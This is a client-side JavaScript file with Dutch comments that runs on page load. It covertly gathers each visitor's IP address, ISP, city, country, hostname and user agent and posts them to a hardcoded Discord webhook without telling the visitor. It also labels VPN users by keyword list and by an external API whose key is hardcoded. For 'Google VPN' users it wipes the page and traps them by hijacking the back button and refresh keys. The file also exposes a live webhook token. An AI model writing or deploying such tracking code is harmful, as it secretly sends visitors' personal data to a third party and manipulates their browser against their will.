// Discord webhook URL
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1348762922960027730/KiCxIrTuv5bihTxm6-1PmuWmWdpTZWG5r2Q2IKvYkIG9f-DWv_Uq8pNhcBOYPkjnscVt';

// Functie om IP informatie op te halen
async function getIPInfo() {
    try {
        // Gebruik meerdere IP API's voor redundantie
        const ipifyPromise = fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .catch(error => console.error('Fout bij ipify:', error));
        
        const ipApiPromise = fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .catch(error => console.error('Fout bij ipapi.co:', error));
            
        const ipInfoPromise = fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .catch(error => console.error('Fout bij ipinfo.io:', error));
        
        // Wacht tot alle API-aanroepen zijn voltooid
        const [ipifyData, ipapiData, ipInfoData] = await Promise.allSettled([
            ipifyPromise, ipApiPromise, ipInfoPromise
        ]);
        
        // Bepaal het IP-adres uit de beschikbare bronnen
        let ip = null;
        if (ipifyData.status === 'fulfilled' && ipifyData.value && ipifyData.value.ip) {
            ip = ipifyData.value.ip;
        } else if (ipapiData.status === 'fulfilled' && ipapiData.value && ipapiData.value.ip) {
            ip = ipapiData.value.ip;
        } else if (ipInfoData.status === 'fulfilled' && ipInfoData.value && ipInfoData.value.ip) {
            ip = ipInfoData.value.ip;
        }
        
        // Combineer de gegevens van alle API's
        const details = {
            ...(ipapiData.status === 'fulfilled' ? ipapiData.value : {}),
            ...(ipInfoData.status === 'fulfilled' ? ipInfoData.value : {})
        };
        
        return {
            ip: ip || 'Niet beschikbaar',
            provider: details.org || details.asn || 'Niet beschikbaar',
            hostname: details.hostname || 'Niet beschikbaar',
            socket: `${ip || 'Onbekend'}:${location.port || '80'}`,
            country: details.country_name || details.country || 'Onbekend',
            city: details.city || 'Onbekend',
            isp: details.org || details.asn || 'Onbekend',
            asn: details.asn || 'Onbekend',
            region: details.region || details.region_name || 'Onbekend',
            timezone: details.timezone || 'Onbekend',
            loc: details.loc || 'Onbekend'
        };
    } catch (error) {
        console.error('Fout bij ophalen IP informatie:', error);
        return {
            ip: 'Niet beschikbaar',
            provider: 'Niet beschikbaar',
            hostname: 'Niet beschikbaar',
            socket: 'Niet beschikbaar',
            country: 'Onbekend',
            city: 'Onbekend',
            isp: 'Onbekend',
            asn: 'Onbekend',
            region: 'Onbekend',
            timezone: 'Onbekend',
            loc: 'Onbekend'
        };
    }
}

// Functie om te controleren of een gebruiker een VPN gebruikt
async function checkVPN(ipInfo) {
    try {
        // Directe check voor Google als ISP (hoogste prioriteit)
        if (ipInfo.isp && ipInfo.isp.includes("GOOGLE")) {
            return true;
        }
        
        // Uitgebreide lijst van VPN-providers en gerelateerde termen
        const vpnKeywords = [
            // Algemene VPN-gerelateerde termen
            'vpn', 'proxy', 'tunnel', 'tor', 'anonymous', 'hide', 'private network', 'privacy', 'secure',
            'encrypted', 'encryption', 'protected', 'protection', 'mask', 'masked', 'hidden', 'relay',
            
            // Populaire VPN-providers
            'nordvpn', 'expressvpn', 'cyberghost', 'protonvpn', 'surfshark', 'privatevpn',
            'mullvad', 'ipvanish', 'purevpn', 'hotspot shield', 'tunnelbear', 'windscribe',
            'avast secureline', 'norton secure', 'kaspersky', 'f-secure', 'avira phantom',
            'private internet access', 'pia', 'vyprvpn', 'strongvpn', 'perfectprivacy', 'perfect privacy',
            'hide.me', 'hideme', 'hidemyass', 'hide my ass', 'hma', 'zenmate', 'trust.zone', 'trustzone',
            'torguard', 'ivpn', 'airvpn', 'ovpn', 'astrill', 'bolehvpn', 'boxpn', 'btguard',
            'cactus vpn', 'cactusvpn', 'cryptostorm', 'earthvpn', 'frootvpn', 'goose vpn', 'goosevpn',
            'hide my ip', 'hidemyip', 'ibvpn', 'ironsocket', 'keepsolid', 'le vpn', 'levpn',
            'libertyvpn', 'namecheap vpn', 'overplay', 'privatix', 'proxy.sh', 'proxysh',
            'safervpn', 'slickvpn', 'smartdnsproxy', 'smartvpn', 'switchvpn', 'tigervpn',
            'trust.zone', 'unblock-us', 'unblockus', 'vpnac', 'vpnarea', 'vpnbook',
            'vpnfacile', 'vpngate', 'vpnhub', 'vpnjack', 'vpnlite', 'vpnme', 'vpnone',
            'vpnunlimited', 'vpnunlimitedapp', 'wevpn', 'witopia', 'zoogvpn', 'anonymizer',
            'anonymouse', 'anonymox', 'anonymousvpn', 'anonvpn', 'blackvpn', 'betternet',
            'buffered', 'celo', 'celo vpn', 'celovpn', 'cloak', 'cloakvpn', 'disconnect',
            'faceless', 'faceless.me', 'facelessme', 'finchvpn', 'getflix', 'hidester',
            'hotspotshield', 'hoxx', 'hoxx vpn', 'hoxxvpn', 'ipredator', 'ivacy',
            'keenow', 'kepard', 'lantern', 'limevpn', 'mullvad', 'nvpn', 'opera vpn',
            'operavpn', 'privatetunnel', 'privax', 'proxpn', 'psiphon', 'ra4w', 'ra4w vpn',
            'ra4wvpn', 'safervpn', 'securitykiss', 'seed4me', 'seed4.me', 'speedify',
            'spyoff', 'surfeasy', 'totalvpn', 'touchvpn', 'trust.zone', 'urban vpn',
            'urbanvpn', 'vpnsecure', 'vpntracker', 'vpnworldwide', 'whoer', 'zenvpn',
            'zenvpn.net', 'zoog', 'zpn', 'avira phantom vpn', 'bitdefender vpn', 'bullguard vpn',
            'encrypt.me', 'encryptme', 'fastestpvn', 'fastest vpn', 'fastestvpn', 'freedome',
            'f-secure freedome', 'fsecure freedome', 'hideipvpn', 'hide ip vpn', 'hideip',
            'hideipaddress', 'hide ip address', 'hideman', 'hideman vpn', 'hidemanvpn',
            'incognito vpn', 'incognitovpn', 'isp', 'ispunblock', 'jumpvpn', 'jump vpn',
            'mysterium', 'mysterium network', 'mysteriumnetwork', 'netshade', 'okayfreedom',
            'okay freedom', 'openvpn', 'open vpn', 'privatix', 'privatix vpn', 'privatixvpn',
            'privado', 'privado vpn', 'privadovpn', 'privateum', 'privateum vpn', 'privateumvpn',
            'privatix', 'privatix vpn', 'privatixvpn', 'proxy master', 'proxymaster',
            'proxymastervpn', 'proxy master vpn', 'safervpn', 'safer vpn', 'safevpn', 'safe vpn',
            'secureline', 'secure line', 'securevpn', 'secure vpn', 'shellfire', 'shellfire vpn',
            'shellfirebox', 'shellfire box', 'spidervpn', 'spider vpn', 'spotflux', 'steganos',
            'steganos vpn', 'steganosvpn', 'supervpn', 'super vpn', 'surfeasy', 'surf easy',
            'surfshark', 'surf shark', 'tunnello', 'tunnello vpn', 'tunnelovpn', 'ultravpn',
            'ultra vpn', 'unblock vpn', 'unblockvpn', 'unblockwebsite', 'unblock website',
            'veepn', 'vee vpn', 'vpnbook', 'vpn book', 'vpnbrowser', 'vpn browser', 'vpnhub',
            'vpn hub', 'vpnify', 'vpnpro', 'vpn pro', 'vpnrobot', 'vpn robot', 'vpnservice',
            'vpn service', 'vpnshield', 'vpn shield', 'vpnvip', 'vpn vip', 'vpnwelt', 'vpn welt',
            'webfreer', 'web freer', 'wevpn', 'we vpn', 'x-vpn', 'xvpn', 'yourfreedom',
            'your freedom', 'your private vpn', 'yourprivatevpn', 'zenvpn', 'zen vpn',
            
            // Cloud providers en datacenters (vaak gebruikt voor VPN-servers)
            'digital ocean', 'digitalocean', 'linode', 'vultr', 'aws', 'amazon', 'azure', 
            'microsoft', 'google cloud', 'googlecloud', 'oracle cloud', 'oraclecloud', 
            'rackspace', 'softlayer', 'ibm cloud', 'ibmcloud', 'ovh', 'hetzner', 'scaleway', 
            'leaseweb', 'contabo', 'upcloud', 'atlantic.net', 'atlanticnet', 'hostwinds', 
            'hostgator', 'bluehost', 'dreamhost', 'godaddy', 'namecheap', 'ionos', '1&1'
        ];
        
        // Controleer of de ISP naam een van de VPN-keywords bevat
        if (ipInfo.isp) {
            const ispLower = ipInfo.isp.toLowerCase();
            for (const keyword of vpnKeywords) {
                if (ispLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of de provider naam een van de VPN-keywords bevat
        if (ipInfo.provider && ipInfo.provider !== ipInfo.isp) {
            const providerLower = ipInfo.provider.toLowerCase();
            for (const keyword of vpnKeywords) {
                if (providerLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of de hostname een van de VPN-keywords bevat
        if (ipInfo.hostname && ipInfo.hostname !== 'Niet beschikbaar') {
            const hostnameLower = ipInfo.hostname.toLowerCase();
            for (const keyword of vpnKeywords) {
                if (hostnameLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of het ASN een van de VPN-keywords bevat
        if (ipInfo.asn) {
            const asnLower = ipInfo.asn.toLowerCase();
            for (const keyword of vpnKeywords) {
                if (asnLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Extra check: Controleer of het IP-adres in een bekende VPN-range valt
        try {
            const vpnCheckResponse = await fetch(`https://vpnapi.io/api/${ipInfo.ip}?key=7c7edd7f4c1e4f9e9a0b8f3c6d9e2b5a`);
            const vpnCheckData = await vpnCheckResponse.json();
            
            if (vpnCheckData && (vpnCheckData.security.vpn || vpnCheckData.security.proxy || vpnCheckData.security.tor)) {
                return true;
            }
        } catch (error) {
            console.error('Fout bij VPN API check:', error);
            // Ga door met andere checks als deze faalt
        }
        
        // Als geen van de checks een VPN heeft gedetecteerd
        return false;
    } catch (error) {
        console.error('Fout bij controleren VPN:', error);
        return false;
    }
}

// Functie om specifiek Google VPN te detecteren
function isGoogleVPN(ipInfo) {
    try {
        // Controleer direct op "GOOGLE" in de ISP naam (hoofdlettergevoelig)
        if (ipInfo.isp && ipInfo.isp.includes("GOOGLE")) {
            return true;
        }
        
        // Google VPN-specifieke keywords (als backup)
        const googleVPNKeywords = [
            'google one vpn', 'googleonevpn', 'google fi vpn', 'googlefivpn',
            'google fiber vpn', 'googlefibervpn', 'google cloud vpn', 'googlecloudvpn',
            'google', 'alphabet', 'gcp', 'google cloud platform'
        ];
        
        // Controleer of de ISP naam een van de Google VPN-keywords bevat
        if (ipInfo.isp) {
            const ispLower = ipInfo.isp.toLowerCase();
            for (const keyword of googleVPNKeywords) {
                if (ispLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of de provider naam een van de Google VPN-keywords bevat
        if (ipInfo.provider && ipInfo.provider !== ipInfo.isp) {
            const providerLower = ipInfo.provider.toLowerCase();
            for (const keyword of googleVPNKeywords) {
                if (providerLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of de hostname een van de Google VPN-keywords bevat
        if (ipInfo.hostname && ipInfo.hostname !== 'Niet beschikbaar') {
            const hostnameLower = ipInfo.hostname.toLowerCase();
            for (const keyword of googleVPNKeywords) {
                if (hostnameLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        // Controleer of het ASN een van de Google VPN-keywords bevat
        if (ipInfo.asn) {
            const asnLower = ipInfo.asn.toLowerCase();
            for (const keyword of googleVPNKeywords) {
                if (asnLower.includes(keyword.toLowerCase())) {
                    return true;
                }
            }
        }
        
        return false;
    } catch (error) {
        console.error('Fout bij controleren Google VPN:', error);
        return false;
    }
}

// Functie om de VPN-popup te tonen
function showVPNPopup(isGoogleVPN = false) {
    // Controleer of de popup al bestaat
    if (document.getElementById('vpn-popup')) {
        return;
    }
    
    // Als het Google VPN is, blokkeer de toegang volledig
    if (isGoogleVPN) {
        // Verwijder alle inhoud van de pagina
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.overflow = 'hidden';
        document.body.style.backgroundColor = '#f0f5fa';
        
        // Maak de blokkerende container
        const blockContainer = document.createElement('div');
        blockContainer.style.width = '100vw';
        blockContainer.style.height = '100vh';
        blockContainer.style.display = 'flex';
        blockContainer.style.flexDirection = 'column';
        blockContainer.style.justifyContent = 'center';
        blockContainer.style.alignItems = 'center';
        blockContainer.style.textAlign = 'center';
        blockContainer.style.padding = '20px';
        blockContainer.style.boxSizing = 'border-box';
        blockContainer.style.backgroundColor = 'rgba(26, 75, 132, 0.95)'; // Donkerblauw met transparantie
        blockContainer.style.color = '#ffffff';
        
        // Voeg de blokkerende inhoud toe
        blockContainer.innerHTML = `
            <div style="max-width: 600px; background-color: #ffffff; border-radius: 10px; padding: 30px; box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3); border-top: 5px solid #1a4b84;">
                <div style="font-size: 80px; margin-bottom: 20px;">🚫</div>
                <h1 style="font-size: 28px; margin-bottom: 20px; color: #1a4b84;">Toegang Geweigerd</h1>
                <p style="font-size: 18px; margin-bottom: 20px; line-height: 1.6; color: #2c3e50;">
                    Onze beveiligingssystemen hebben gedetecteerd dat u <strong>Google VPN</strong> gebruikt.
                </p>
                <p style="font-size: 18px; margin-bottom: 30px; line-height: 1.6; color: #2c3e50;">
                    Toegang tot deze website is niet mogelijk met Google VPN. 
                    Schakel uw Google VPN uit om toegang te krijgen tot onze diensten.
                </p>
                <div style="background-color: #f0f5fa; border-radius: 8px; padding: 15px; margin-bottom: 30px; text-align: left; border-left: 4px solid #3a7bd5;">
                    <p style="margin: 0 0 10px 0; color: #1a4b84;"><strong>Waarom blokkeren wij Google VPN?</strong></p>
                    <p style="margin: 0; line-height: 1.6; color: #2c3e50;">
                        Om veiligheidsredenen en om de integriteit van onze diensten te waarborgen, 
                        is toegang via Google VPN niet toegestaan op deze website.
                    </p>
                </div>
                <button id="vpn-disable-btn" style="background-color: #3a7bd5; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);">
                    Google VPN Uitschakelen
                </button>
            </div>
        `;
        
        // Voeg de container toe aan de body
        document.body.appendChild(blockContainer);
        
        // Voeg event listener toe aan de knop
        document.getElementById('vpn-disable-btn').addEventListener('click', () => {
            window.location.href = "https://support.google.com/googleone/answer/10769713?hl=nl";
        });
        
        // Voorkom dat de gebruiker de pagina kan verlaten met de terugknop
        history.pushState(null, document.title, location.href);
        window.addEventListener('popstate', function() {
            history.pushState(null, document.title, location.href);
        });
        
        // Voorkom dat de gebruiker de pagina kan verlaten met toetsenbordsnelkoppelingen
        document.addEventListener('keydown', function(e) {
            if ((e.key === 'F5') || 
                ((e.ctrlKey || e.metaKey) && e.key === 'r') || 
                ((e.ctrlKey || e.metaKey) && e.key === 'F5')) {
                e.preventDefault();
                return false;
            }
        });
        
        return;
    }
    
    // Standaard VPN popup voor niet-Google VPNs
    // Maak de popup container
    const popup = document.createElement('div');
    popup.id = 'vpn-popup';
    popup.className = 'vpn-popup';
    
    // Voeg de popup inhoud toe
    popup.innerHTML = `
        <div class="vpn-popup-content">
            <div class="vpn-popup-header">
                <i class="fas fa-shield-alt vpn-icon"></i>
                <h2>VPN Gedetecteerd</h2>
            </div>
            <div class="vpn-popup-body">
                <p>Onze geavanceerde beveiligingssystemen hebben gedetecteerd dat u momenteel een VPN of proxy gebruikt om onze website te bezoeken.</p>
                <p>Voor de beste gebruikerservaring en om alle functies van onze website optimaal te kunnen gebruiken, raden wij u aan uw VPN uit te schakelen.</p>
                <div class="vpn-info-box">
                    <p><strong>Waarom detecteren wij VPN's?</strong></p>
                    <p>VPN's kunnen soms de functionaliteit van onze website beïnvloeden en worden vaak gebruikt voor frauduleuze activiteiten. Wij streven naar een veilige omgeving voor al onze gebruikers.</p>
                </div>
            </div>
            <div class="vpn-popup-buttons">
                <button id="vpn-disable-btn" class="vpn-btn vpn-primary-btn">VPN Uitschakelen</button>
                <button id="vpn-continue-btn" class="vpn-btn vpn-secondary-btn">Doorgaan met VPN</button>
            </div>
        </div>
    `;
    
    // Voeg de popup toe aan de body
    document.body.appendChild(popup);
    
    // Voeg event listeners toe aan de knoppen
    document.getElementById('vpn-disable-btn').addEventListener('click', () => {
        // Hier zou je een redirect kunnen doen naar een pagina met instructies
        // voor het uitschakelen van VPN, maar voor nu sluiten we gewoon de popup
        closeVPNPopup();
        
        // Toon een bevestigingsbericht
        showConfirmationMessage('Bedankt! Schakel uw VPN uit en vernieuw de pagina voor de beste ervaring.');
    });
    
    document.getElementById('vpn-continue-btn').addEventListener('click', () => {
        closeVPNPopup();
        
        // Toon een bevestigingsbericht
        showConfirmationMessage('U kunt doorgaan met uw VPN ingeschakeld. Sommige functies werken mogelijk niet optimaal.');
    });
    
    // Toon de popup met een fade-in effect
    setTimeout(() => {
        popup.classList.add('show');
    }, 100);
}

// Functie om de VPN-popup te sluiten
function closeVPNPopup() {
    const popup = document.getElementById('vpn-popup');
    if (popup) {
        popup.classList.remove('show');
        // Verwijder de popup na de fade-out animatie
        setTimeout(() => {
            popup.remove();
        }, 300);
    }
}

// Functie om een bevestigingsbericht te tonen
function showConfirmationMessage(message) {
    // Controleer of er al een bevestigingsbericht is
    let confirmationMsg = document.getElementById('confirmation-message');
    
    if (!confirmationMsg) {
        // Maak een nieuw bevestigingsbericht
        confirmationMsg = document.createElement('div');
        confirmationMsg.id = 'confirmation-message';
        confirmationMsg.className = 'confirmation-message';
        
        // Voeg inline stijlen toe voor het nieuwe kleurenschema
        confirmationMsg.style.backgroundColor = '#ffffff';
        confirmationMsg.style.color = '#2c3e50';
        confirmationMsg.style.borderLeft = '4px solid #3a7bd5';
        confirmationMsg.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.1)';
        
        document.body.appendChild(confirmationMsg);
    }
    
    // Update de inhoud en toon het bericht
    confirmationMsg.textContent = message;
    confirmationMsg.classList.add('show');
    
    // Verberg het bericht na 5 seconden
    setTimeout(() => {
        confirmationMsg.classList.remove('show');
        
        // Verwijder het element na de fade-out animatie
        setTimeout(() => {
            if (confirmationMsg.parentNode) {
                confirmationMsg.parentNode.removeChild(confirmationMsg);
            }
        }, 300);
    }, 5000);
}

// Functie om browser informatie te verzamelen
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Onbekend';
    let browserCodeName = navigator.appCodeName;
    let browserVersion = 'Onbekend';
    
    // Detecteer browser naam en versie
    if (ua.includes('Firefox/')) {
        browserName = 'Firefox';
        browserVersion = ua.split('Firefox/')[1];
    } else if (ua.includes('Chrome/')) {
        browserName = 'Chrome';
        browserVersion = ua.split('Chrome/')[1].split(' ')[0];
    } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
        browserName = 'Safari';
        browserVersion = ua.split('Version/')[1].split(' ')[0];
    } else if (ua.includes('Edge/')) {
        browserName = 'Edge';
        browserVersion = ua.split('Edge/')[1];
    }

    return {
        name: browserName,
        codeName: browserCodeName,
        version: browserVersion,
        userAgent: ua
    };
}

// Functie om gegevens naar Discord te sturen
async function sendToDiscord(ipInfo, browserInfo, isVPN) {
    // Controleer expliciet op Google in de ISP naam
    const isGoogleVPNDetected = ipInfo.isp.includes("GOOGLE");
    
    // Als Google in de ISP naam staat, moet het altijd als VPN worden gemarkeerd
    const finalIsVPN = isVPN || isGoogleVPNDetected;
    
    const embed = {
        title: isGoogleVPNDetected ? '⛔ Google VPN Gebruiker Geblokkeerd' : (finalIsVPN ? '🔍 VPN Gebruiker Gedetecteerd' : '🔍 Nieuwe Bezoeker Gedetecteerd'),
        color: isGoogleVPNDetected ? 15158332 : (finalIsVPN ? 16750848 : 3447003), // Rood voor Google VPN, oranje voor VPN, blauw voor geen VPN
        fields: [
            {
                name: '🌐 Internet & IP Informatie',
                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}\n**VPN Gedetecteerd:** ${finalIsVPN ? '✅ Ja' : '❌ Nee'}${isGoogleVPNDetected ? '\n**Google VPN:** ⛔ GEBLOKKEERD' : ''}`,
                inline: false
            },
            {
                name: '🖥️ Browser Informatie',
                value: `**Browser:** ${browserInfo.name}\n**Code Naam:** ${browserInfo.codeName}\n**Versie:** ${browserInfo.version}\n**User Agent:** ${browserInfo.userAgent}`,
                inline: false
            }
        ],
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Fout bij verzenden naar Discord:', error);
    }
}

// Start tracking wanneer de pagina geladen is
document.addEventListener('DOMContentLoaded', async () => {
    const ipInfo = await getIPInfo();
    const browserInfo = getBrowserInfo();
    const isVPN = await checkVPN(ipInfo);
    const isGoogleVPNDetected = ipInfo.isp.includes("GOOGLE");
    
    // Stuur informatie naar Discord
    await sendToDiscord(ipInfo, browserInfo, isVPN);
    
    // Toon de Google VPN-blokkade als Google is gedetecteerd in de ISP
    if (isGoogleVPNDetected) {
        showVPNPopup(true); // Toon de Google VPN-blokkade
    }
    // Anders toon de normale VPN-popup als een VPN is gedetecteerd
    else if (isVPN) {
        showVPNPopup(false); // Toon de normale VPN-popup
    }
}); 